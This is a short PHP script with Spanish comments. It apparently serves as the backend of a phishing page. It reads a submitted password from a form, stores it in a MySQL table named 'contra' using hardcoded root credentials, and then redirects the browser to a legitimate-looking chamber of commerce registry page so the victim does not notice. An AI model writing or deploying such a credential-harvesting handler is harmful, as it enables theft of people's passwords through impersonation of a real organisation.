<?php 

try{

$base = new PDO("mysql:host=localhost; dbname=out", "root","clave.123");

$base->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$base->exec("SET CHARACTER SET utf8");//----------juego de caracteres



$contra= $_POST['pass'];


$sql="INSERT INTO contra(pass) VALUES(:pass)";

  $resultado= $base->prepare($sql);  

//------------------------------ejecuta consulta----------------
  $resultado->execute(array(":pass"=>$contra));

  
  header('location: https://ccneiva.org/registros-publicos/tarifas/');







}catch(exception $e){
die("error " . $e->getMessage());
echo "linea de error " . $e->getLine();

}



 ?>